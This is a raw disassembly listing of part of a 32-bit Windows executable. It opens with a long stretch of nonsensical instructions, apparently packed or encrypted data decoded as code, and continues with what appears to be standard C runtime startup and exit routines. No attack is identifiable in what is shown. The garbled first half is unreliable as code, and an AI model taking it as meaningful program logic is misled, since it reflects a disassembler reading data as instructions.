  422571:	mov    ds:0x3f1c727f,al
  422576:	add    ebx,ebp
  422578:	xor    ecx,DWORD PTR [edi+0x5e3ff2ae]
  42257e:	aas    
  42257f:	xor    BYTE PTR [ebx-0x32894809],cl
  422585:	push   ebp
  422586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422587:	inc    ebp
  422588:	xor    BYTE PTR [ebp-0x6c],al
  42258b:	ror    DWORD PTR [ecx-0x3e],0xf1
  42258f:	fld    QWORD PTR es:[esi-0x26bca1be]
  422596:	sub    edx,0x0
  422599:	dec    edi
  42259a:	popf   
  42259b:	adc    eax,0x3da4ecf8
  4225a0:	xor    BYTE PTR [esi],ch
  4225a2:	jmp    0xd5f39da0
  4225a7:	inc    esi
  4225a8:	jge    0x42255a
  4225aa:	stc    
  4225ab:	mov    ds:0xc57483b7,eax
  4225b0:	dec    ecx
  4225b1:	cmp    DWORD PTR [eax],esi
  4225b3:	jmp    DWORD PTR [ebx]
  4225b5:	jecxz  0x422596
  4225b7:	aas    
  4225b8:	pop    es
  4225b9:	inc    edi
  4225ba:	scas   al,BYTE PTR es:[edi]
  4225bb:	xor    DWORD PTR [ebp+0x5c],esi
  4225be:	push   ecx
  4225bf:	mov    eax,ds:0xed320b0b
  4225c4:	jno    0x4225bd
  4225c6:	xor    eax,esp
  4225c8:	rol    BYTE PTR [edi+0x75ba5968],cl
  4225ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225cf:	sbb    eax,0xcd306e9d
  4225d4:	sub    ecx,DWORD PTR [ebx+0x4f9b1625]
  4225da:	pop    edi
  4225db:	mov    dh,0x75
  4225dd:	mov    DWORD PTR [esi],ebx
  4225df:	inc    eax
  4225e0:	(bad)
  4225e3:	xchg   DWORD PTR [edx+0x44],ecx
  4225e6:	pop    DWORD PTR [eax+0x6124eb4]
  4225ec:	sbb    dh,BYTE PTR [edx-0x4e]
  4225ef:	xor    al,0xb
  4225f1:	jge    0x4225cb
  4225f3:	mov    esi,0x2db1ec29
  4225f8:	test   eax,0x256b2f6c
  4225fd:	or     eax,0x8cbbd341
  422602:	jge    0x422640
  422604:	dec    eax
  422605:	das    
  422606:	shl    ecx,cl
  422608:	das    
  422609:	(bad)  
  42260a:	cli    
  42260b:	xchg   ecx,eax
  42260c:	(bad)  [ebp+0x1f]
  42260f:	ss cwde 
  422611:	cwde   
  422612:	and    ebp,DWORD PTR [esi+0x49]
  422615:	daa    
  422616:	push   ss
  422617:	ret    0xc817
  42261a:	xor    edx,DWORD PTR [ecx]
  42261c:	hlt    
  42261d:	jge    0x422602
  42261f:	pop    es
  422620:	pop    ds
  422621:	out    dx,eax
  422622:	or     al,0xe5
  422624:	jp     0x422607
  422626:	xchg   edx,eax
  422627:	push   esi
  422628:	addr16 retf 0xc283
  42262c:	sbb    dh,BYTE PTR ds:0xb9dbc24b
  422632:	push   0xba76b8f4
  422637:	pop    edx
  422638:	lods   al,BYTE PTR ds:[esi]
  422639:	mov    dl,0xea
  42263b:	and    cl,BYTE PTR [ecx]
  42263d:	(bad)  [ecx-0x62883dc2]
  422643:	add    eax,0x25028088
  422648:	out    0x26,al
  42264a:	mov    edi,0xf7e25c
  42264f:	mov    cl,0xd2
  422651:	aam    0x4d
  422653:	fidivr WORD PTR [ecx+0x5a]
  422656:	jb     0x42268f
  422658:	fwait
  422659:	aam    0x1b
  42265b:	mov    ah,0xff
  42265d:	cmp    ecx,DWORD PTR [ecx]
  42265f:	dec    ecx
  422660:	test   al,0x33
  422662:	imul   ebx,DWORD PTR [ebx+edx*1-0x7b9275d6],0xcd93b48c
  42266d:	add    al,BYTE PTR [ebp+edi*4+0x403d8967]
  422674:	push   0x12a08b33
  422679:	int    0x57
  42267b:	dec    ebp
  42267c:	gs dec esi
  42267e:	fs (bad) 
  422680:	jg     0x4226bf
  422682:	xchg   ebp,eax
  422683:	out    dx,al
  422684:	xor    BYTE PTR [edi],ah
  422686:	push   esi
  422687:	je     0x422614
  422689:	ffreep st(6)
  42268b:	pop    ss
  42268c:	add    BYTE PTR [edi-0x51],cl
  42268f:	xchg   BYTE PTR [edx*1+0x44f5cc],ah
  422696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422697:	push   es
  422698:	adc    cl,BYTE PTR [edi]
  42269a:	test   al,0x18
  42269c:	scas   eax,DWORD PTR es:[edi]
  42269d:	loope  0x42271b
  42269f:	xlat   BYTE PTR ds:[ebx]
  4226a0:	dec    edi
  4226a1:	icebp  
  4226a2:	push   es
  4226a3:	adc    bh,dh
  4226a5:	jns    0x4226a1
  4226a7:	fdivrp st(5),st
  4226a9:	mov    bh,BYTE PTR [edi-0x4]
  4226ac:	mov    DWORD PTR [ebx-0x1083d2ee],eax
  4226b2:	gs jae 0x422723
  4226b5:	outs   dx,BYTE PTR ds:[esi]
  4226b6:	dec    ecx
  4226b7:	adc    bh,dh
  4226b9:	sbb    ebp,0x7afbe7a7
  4226bf:	stc    
  4226c0:	nop
  4226c1:	mov    al,ds:0x6ae88923
  4226c6:	in     eax,0x42
  4226c8:	sbb    bl,cl
  4226ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226cb:	sbb    eax,0xff3847c1
  4226d0:	fs push esi
  4226d2:	sub    ch,bh
  4226d4:	jae    0x42268c
  4226d6:	add    DWORD PTR [esi],0x59
  4226d9:	xor    BYTE PTR [ecx+0x2b785dea],0x9e
  4226e0:	sbb    DWORD PTR [si+0x7a],edx
  4226e4:	and    ebx,DWORD PTR [edi]
  4226e6:	in     eax,0x3d
  4226e8:	jle    0x422685
  4226ea:	push   ebp
  4226eb:	xor    DWORD PTR [ebx-0x80],edi
  4226ee:	dec    ecx
  4226ef:	push   edi
  4226f0:	inc    eax
  4226f1:	call   0x65be:0x7002b564
  4226f8:	sub    BYTE PTR [eax],cl
  4226fa:	dec    ebp
  4226fb:	add    eax,0x1337e976
  422700:	xchg   BYTE PTR [ecx+0xe],dl
  422703:	sbb    BYTE PTR [eax-0x10d78789],ch
  422709:	nop
  42270a:	and    esi,DWORD PTR [esi]
  42270c:	jbe    0x4226be
  42270e:	rol    DWORD PTR [edi+0x2],0x33
  422712:	jecxz  0x42272f
  422714:	cmp    dl,BYTE PTR [ecx-0x3989748a]
  42271a:	lods   eax,DWORD PTR ds:[esi]
  42271b:	sbb    al,0xa3
  42271d:	fst    DWORD PTR [edx+0x5e]
  422720:	jns    0x422792
  422722:	pop    esi
  422723:	and    al,0x83
  422725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422726:	mov    bh,0x57
  422728:	sbb    ecx,DWORD PTR [bx+di-0xae4]
  42272d:	je     0x4226f4
  42272f:	stos   DWORD PTR es:[edi],eax
  422730:	imul   ecx,DWORD PTR [ecx+0x4f],0x56
  422734:	out    0x55,al
  422736:	rol    BYTE PTR [ecx+ebp*4+0x57],0xde
  42273b:	dec    esi
  42273c:	mov    al,0x36
  42273e:	push   ebx
  42273f:	pop    edx
  422740:	call   0x6089721d
  422745:	pushf  
  422746:	push   eax
  422747:	dec    ebx
  422748:	xor    BYTE PTR [esi],cl
  42274a:	adc    esp,DWORD PTR [ecx]
  42274c:	and    BYTE PTR [eax],ah
  42274e:	or     DWORD PTR [eax+0x23dcec21],edx
  422754:	int    0x45
  422756:	jb     0x422739
  422758:	in     eax,dx
  422759:	mov    edx,0x1b86de44
  42275e:	xchg   ecx,eax
  42275f:	scas   eax,DWORD PTR es:[edi]
  422760:	xor    ebx,esi
  422762:	lods   al,BYTE PTR ds:[esi]
  422763:	add    bl,ch
  422765:	jmp    0x25c5:0x1d52c744
  42276c:	push   ds
  42276d:	fimul  WORD PTR [esi+0x190eef77]
  422773:	dec    edx
  422774:	push   ebx
  422775:	push   esi
  422776:	sbb    DWORD PTR [ecx+esi*4-0x77a8adf7],ecx
  42277d:	shr    DWORD PTR [eax+0x40],cl
  422780:	cmp    BYTE PTR [edx-0x72624c],0xab
  422787:	sti    
  422788:	xor    eax,0x3b11cad
  42278d:	fs jb  0x422794
  422790:	pop    ds
  422791:	call   0xba61:0x59b2ec0c
  422798:	(bad)  
  42279a:	ficomp DWORD PTR [edx+ebx*1-0x40]
  42279e:	in     al,0x91
  4227a0:	sar    BYTE PTR [edx],cl
  4227a2:	sar    DWORD PTR [edx],cl
  4227a4:	push   esp
  4227a5:	xor    eax,0x9a11b03
  4227aa:	stc    
  4227ab:	dec    edi
  4227ac:	xor    esp,ebp
  4227ae:	repz sar dh,cl
  4227b1:	pop    es
  4227b2:	mov    dl,0xd4
  4227b4:	(bad)  
  4227b5:	cmp    BYTE PTR [ecx+ebp*8-0x4cad8e6c],cl
  4227bc:	arpl   WORD PTR [ecx+0x55e631b0],ax
  4227c2:	and    al,0xc6
  4227c4:	nop
  4227c5:	add    edi,eax
  4227c7:	push   edx
  4227c8:	dec    BYTE PTR [ecx]
  4227ca:	call   0xc638:0xb876fdbd
  4227d1:	sti    
  4227d2:	(bad)  
  4227d3:	cmp    ebp,eax
  4227d5:	aad    0x13
  4227d7:	cmp    al,0xf0
  4227d9:	mov    bh,0x2f
  4227db:	rol    BYTE PTR [ecx],cl
  4227dd:	sub    eax,0xfd2b3396
  4227e2:	in     al,dx
  4227e3:	jmp    0x58e0:0xca717a68
  4227ea:	push   ebx
  4227eb:	inc    ecx
  4227ec:	jge    0x42279c
  4227ee:	(bad)  
  4227ef:	hlt    
  4227f0:	and    esp,DWORD PTR ds:0x90af6726
  4227f6:	rol    BYTE PTR [eax+ebp*4],cl
  4227f9:	inc    esp
  4227fa:	into   
  4227fb:	int    0xc7
  4227fd:	sub    DWORD PTR es:[eax+ebp*8],edx
  422801:	int    0x6d
  422803:	push   ds
  422804:	icebp  
  422805:	outs   dx,DWORD PTR ds:[esi]
  422806:	and    ecx,esp
  422808:	push   esi
  422809:	xchg   edi,eax
  42280a:	inc    ebp
  42280b:	dec    esp
  42280c:	mov    edi,0xd8de8a0d
  422811:	daa    
  422812:	and    cl,al
  422814:	adc    al,ch
  422816:	lods   al,BYTE PTR ds:[esi]
  422817:	call   0x49d4:0xc11ff539
  42281e:	or     eax,0xe2081691
  422823:	jns    0x4227ee
  422825:	inc    edi
  422826:	mov    esp,0xeb49174d
  42282b:	mov    ah,0x9d
  42282d:	popa   
  42282e:	cmp    DWORD PTR [edx],ebx
  422830:	and    ebp,DWORD PTR [eax-0xbf5f87b]
  422836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422837:	pop    ds
  422838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422839:	xor    DWORD PTR [ebp+0x48],eax
  42283c:	sahf   
  42283d:	fdivr  QWORD PTR ds:0x6193d0c2
  422843:	or     eax,0x44678d58
  422848:	mov    esp,0x30d6a5da
  42284d:	in     eax,dx
  42284e:	adc    BYTE PTR ds:0x4b4b924d,0xd4
  422855:	xchg   esi,eax
  422856:	push   edx
  422857:	sub    DWORD PTR [esi],eax
  422859:	fnstcw WORD PTR [edi]
  42285b:	cmc    
  42285c:	neg    DWORD PTR [eax+eiz*2]
  42285f:	cwde   
  422860:	pusha  
  422861:	fistp  QWORD PTR [ecx+0x318e185b]
  422867:	mov    edx,0x5f174121
  42286c:	pop    eax
  42286d:	imul   edx,ecx,0xffffff93
  422870:	pop    esp
  422871:	fcmovnb st,st(2)
  422873:	imul   DWORD PTR ds:0x25bf6645
  422879:	xor    eax,eax
  42287b:	push   edi
  42287c:	lods   al,BYTE PTR ds:[esi]
  42287d:	and    al,0xf2
  42287f:	dec    edx
  422880:	(bad)  
  422882:	mov    ecx,0xbc45fdc4
  422887:	xor    BYTE PTR [esi+ecx*4+0xbfd1187],dh
  42288e:	jle    0x42287a
  422890:	push   esi
  422891:	sbb    eax,0x7c3df19
  422896:	cmp    BYTE PTR [ebp-0x4a],dl
  422899:	jno    0x422888
  42289b:	dec    edi
  42289c:	add    BYTE PTR [eax],dl
  42289e:	retf   
  42289f:	dec    eax
  4228a0:	mov    ch,0x2c
  4228a2:	nop
  4228a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228a5:	mov    ss,WORD PTR [ebp-0x3a6c0726]
  4228ab:	xor    DWORD PTR [edi-0x63],esi
  4228ae:	mov    eax,ds:0xeaaac9ee
  4228b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228b4:	add    ch,dh
  4228b6:	adc    ebx,ebp
  4228b8:	daa    
  4228b9:	and    ebp,DWORD PTR [esp+ecx*1+0x5e8286de]
  4228c0:	repnz loop 0x42290a
  4228c3:	adc    edi,esi
  4228c5:	and    BYTE PTR [ebx-0x641a1d9b],cl
  4228cb:	and    edx,edx
  4228cd:	jae    0x42294c
  4228cf:	lods   eax,DWORD PTR ds:[esi]
  4228d0:	cld    
  4228d1:	add    bh,BYTE PTR [ecx-0x11e395e1]
  4228d7:	idiv   ch
  4228d9:	push   ss
  4228da:	imul   BYTE PTR [ecx+0x237d9ecf]
  4228e0:	cdq    
  4228e1:	inc    ebx
  4228e2:	sbb    eax,0x563d8909
  4228e7:	cmp    BYTE PTR [ebp+0x10],ah
  4228ea:	dec    esp
  4228eb:	jbe    0x42288c
  4228ed:	pop    ss
  4228ee:	xchg   esi,eax
  4228ef:	jg     0x422905
  4228f1:	adc    dl,0xff
  4228f4:	xor    cl,ch
  4228f6:	add    DWORD PTR [eax],esp
  4228f8:	ror    BYTE PTR gs:0x228f3212,0xf4
  422900:	jmp    0x7234e3f1
  422905:	pop    eax
  422906:	jne    0x42288f
  422908:	inc    ebp
  422909:	adc    ebx,esp
  42290b:	mov    ds:0x4a188630,al
  422910:	and    eax,0x14a5c7a8
  422915:	add    BYTE PTR [ebx+0x5c],ch
  422918:	sub    al,0xb5
  42291a:	xchg   edi,eax
  42291b:	pop    ebx
  42291c:	ret    0xd4ec
  42291f:	shl    DWORD PTR [esi-0x34c39ea9],0x50
  422926:	retf   
  422927:	inc    ebx
  422928:	fwait
  422929:	and    eax,DWORD PTR [edi-0x7059ae26]
  42292f:	aaa    
  422930:	adc    ch,BYTE PTR [esi]
  422932:	adc    ebp,DWORD PTR [edi+0x18]
  422935:	mov    BYTE PTR [eax-0x788d2876],bh
  42293b:	stos   BYTE PTR es:[edi],al
  42293c:	and    ecx,DWORD PTR [edi+0x16]
  42293f:	ss inc esp
  422941:	add    DWORD PTR [eax+0x20],ebx
  422944:	mov    cl,BYTE PTR [ebp+eiz*1-0x1d]
  422948:	aas    
  422949:	inc    esp
  42294a:	or     DWORD PTR [edi+0x4350807f],esi
  422950:	jbe    0x42299b
  422952:	enter  0x349a,0x3a
  422956:	and    al,0x82
  422958:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
